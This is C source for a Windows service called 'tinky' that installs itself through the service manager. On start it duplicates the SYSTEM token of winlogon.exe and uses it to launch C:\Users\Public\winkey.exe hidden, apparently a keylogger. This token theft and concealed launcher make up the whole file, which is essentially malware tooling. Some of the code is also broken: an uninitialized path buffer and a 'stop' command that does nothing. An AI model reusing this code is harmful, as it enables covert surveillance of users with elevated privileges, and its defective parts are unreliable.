#include <string.h>
#include <windows.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#pragma comment(lib, "advapi32.lib")

#define SVCNAME TEXT("tinky")
#define WINKEY TEXT("winkey.exe")

SC_HANDLE scManager;
SERVICE_STATUS_HANDLE   g_StatusHandle;
SERVICE_STATUS          g_ServiceStatus;
HANDLE                  g_ServiceStopEvent;
HANDLE                  newExecToken;
PROCESS_INFORMATION     winkeyPI;

VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv);
VOID WINAPI		ServiceCtrlHandler(DWORD CtrlCode);
void			ReportStatus(DWORD state, DWORD Q_ERROR);

int usage(int ac, char** av)
{
	if (ac == 2 && (strcmp(av[1], "install")
		&& strcmp(av[1], "start")
		&& strcmp(av[1], "stop")
		&& strcmp(av[1], "delete")))
	{
		printf("Usage: %s [install | start | stop | delete]\n", av[0]);
		return(0);
	}
	else if (ac == 2)
	{
		if (!strcmp(av[1], "install"))
		{
			printf("install \n");
			return (1);
		}
		else if (!strcmp(av[1], "start"))
		{
			printf("start\n");
			return (2);
		}
		else if (!strcmp(av[1], "stop"))
		{
			printf("stop\n");
			return (3);
		}
		else if (!strcmp(av[1], "delete"))
		{
			printf("delete\n");
			return (4);
		}
	}
	else if (ac == 1)
	{
		printf("install\n");
		return (1);
	}
	return (0);
}

int assign_scManager()
{
	int err;

	scManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!scManager)
	{
		err = GetLastError();
		if (err == ERROR_ACCESS_DENIED)
			printf("No Admin rights \n");
		else
			printf("OpenscManager failed error (%ld)\n", GetLastError());
		return (1);
	}
	return (0);
}

// Create and install service tinky --- 

int install_sc(char* path)
{
	SC_HANDLE scService = OpenService(scManager, SVCNAME, SERVICE_ALL_ACCESS);
	if (scService)
	{
		printf("Service %s exists.\n", SVCNAME);
		return (1);
	}
	scService = CreateService(scManager, SVCNAME, SVCNAME,
		SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
		SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
		path, NULL, NULL, NULL, NULL, NULL);
	if (!scService)
	{
		printf("CreateService failed error (%ld)\n", GetLastError());
		return (1);
	}
	printf("Service %s installed successfully.\n", SVCNAME);
	return (0);
}

//Start service // need dispatcher before start : https://stackoverflow.com/questions/1640114/startservice-fails-with-error-code-1053

int start_sc(void)
{
	SC_HANDLE scService = OpenService(scManager, SVCNAME, SERVICE_ALL_ACCESS);
	if (scService)
	{
		if (!StartService(scService, 0, NULL))
		{
			DWORD err = GetLastError();
			if (err == ERROR_SERVICE_ALREADY_RUNNING)
				printf("Service %s already running.\n", SVCNAME);
			else
				printf("StartService failed error (%ld)\n", err);
			if (!CloseServiceHandle(scService))
				printf("CloseServiceHandle failed error (%ld)\n", err);
			return (1);
		}
		printf("Service %s started successfully.\n", SVCNAME);
		if (!CloseServiceHandle(scService))
			printf("CloseServiceHandle failed error (%ld)\n", GetLastError());
	}
	else
		printf("Service %s is not installed.\n", SVCNAME);
	return (0);
}

int delete_sc(void)
{
	SC_HANDLE scService = OpenService(scManager, SVCNAME, SERVICE_ALL_ACCESS);
	if (!scService)
	{
		printf("Service %s is not installed.\n", SVCNAME);
		return (1);
	}
	SERVICE_STATUS	status;

	if (QueryServiceStatus(scService, &status))
	{
		if (status.dwCurrentState != SERVICE_STOPPED)
			printf("Service %s not stopped yet\n", SVCNAME);
		else
		{
			if (!DeleteService(scService))
				printf("DeleteService failed error (%ld)\n", GetLastError());
			else
			{
				printf("Service %s deleted successfully.\n", SVCNAME);
				return (0);
			}
		}
	}
	else
		printf("ControlService failed error (%ld)\n", GetLastError());
	if (!CloseServiceHandle(scService))
		printf("CloseServiceHandle failed error (%ld)\n", GetLastError());
	return (1);
}

void do_op(int op)
{
	char		path[MAX_PATH];
	
	strcat_s(path, "\\tinky.exe");
	if (op == 1)
		install_sc(path);
	else if (op == 2)
		start_sc();
	else if (op == 4)
		delete_sc();
	else
		printf("smtg else\n");
}

int findProc(const char* procname) {

	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
	pe.dwSize = sizeof(PROCESSENTRY32);
	hResult = Process32First(hSnapshot, &pe);
	while (hResult) {
		if (strcmp(procname, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}

	CloseHandle(hSnapshot);
	return pid;
}

void    launch_winkey() {
	DWORD winlogonPID;
	HANDLE wlPH;
	HANDLE wlTH;

	char* deb = "C:\\Users\\Public\\winkey.exe";
	LPCSTR PP = deb;
	STARTUPINFO Si;

	ZeroMemory(&Si, sizeof(Si));
	Si.cb = sizeof(Si);
	winlogonPID = findProc("winlogon.exe");
	wlPH = OpenProcess(PROCESS_QUERY_INFORMATION, 0, winlogonPID);
	if (!OpenProcessToken(wlPH, TOKEN_DUPLICATE, &wlTH)) {
		printf("opt\n");
	}
	CloseHandle(wlPH);
	if (!DuplicateTokenEx(wlTH, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &newExecToken)) {
		printf("dtEx\n");
	}
	CloseHandle(wlTH);
	if (!CreateProcessAsUser(newExecToken, PP, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &Si, &winkeyPI)) {
		printf("cpwt (%ld)\n", GetLastError());
	}
}

void    kill_winkey() {
	DWORD winkeyPID;
	HANDLE wkPH;

	winkeyPID = findProc("winkey.exe");
	wkPH = OpenProcess(PROCESS_TERMINATE, 0, winkeyPID);
	TerminateProcess(wkPH, 1);
	CloseHandle(wkPH);
}


VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv) {
	if (dwArgc && lpszArgv[dwArgc]) {
		int i;
		i = 0;
	}
	g_StatusHandle = RegisterServiceCtrlHandler(SVCNAME, ServiceCtrlHandler);
	if (g_StatusHandle == NULL) {
		printf("Failed to register Service control handler to service manager\n");
		return;
	}
	ReportStatus(SERVICE_START_PENDING, NO_ERROR);
	g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (g_ServiceStopEvent == NULL) {
		ReportStatus(SERVICE_STOPPED, GetLastError());
		return;
	}
	ReportStatus(SERVICE_RUNNING, NO_ERROR);
	launch_winkey();
	WaitForSingleObject(g_ServiceStopEvent, INFINITE);
	ReportStatus(SERVICE_STOPPED, NO_ERROR);
}

VOID WINAPI		ServiceCtrlHandler(DWORD CtrlCode) {
	switch (CtrlCode) {
	case SERVICE_CONTROL_STOP:
		if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
			break;
		kill_winkey();
		ReportStatus(SERVICE_STOPPED, NO_ERROR);
		break;
	default:
		break;
	}
}

void ReportStatus(DWORD state, DWORD Q_ERROR) {
	g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	g_ServiceStatus.dwControlsAccepted = 0;
	if (state != SERVICE_START_PENDING) {
		g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	}
	g_ServiceStatus.dwCurrentState = state;
	g_ServiceStatus.dwWin32ExitCode = Q_ERROR;
	g_ServiceStatus.dwServiceSpecificExitCode = 0;
	g_ServiceStatus.dwCheckPoint = 0;

	SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

int main(int ac, char** av)
{
	long int	err;
	int			op;

	if ((op = usage(ac, av)))
	{
		if (assign_scManager())
			return (1);
		do_op(op);
		if (!CloseServiceHandle(scManager))
		{
			printf("CloseServiceHandle failed error (%ld)\n", GetLastError());
			return (1);
		}
	}
	else
	{
		SERVICE_TABLE_ENTRY ServiceStartTable[2];
		ServiceStartTable[0].lpServiceName = SVCNAME;
		ServiceStartTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
		ServiceStartTable[1].lpServiceName = NULL;
		ServiceStartTable[1].lpServiceProc = NULL;
		if (StartServiceCtrlDispatcher(ServiceStartTable))
			return 0;
		else if (GetLastError() == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT)
			return -1; // Program not started as a service.
		else
			return -2; // Other error.
	}
	return 0;
}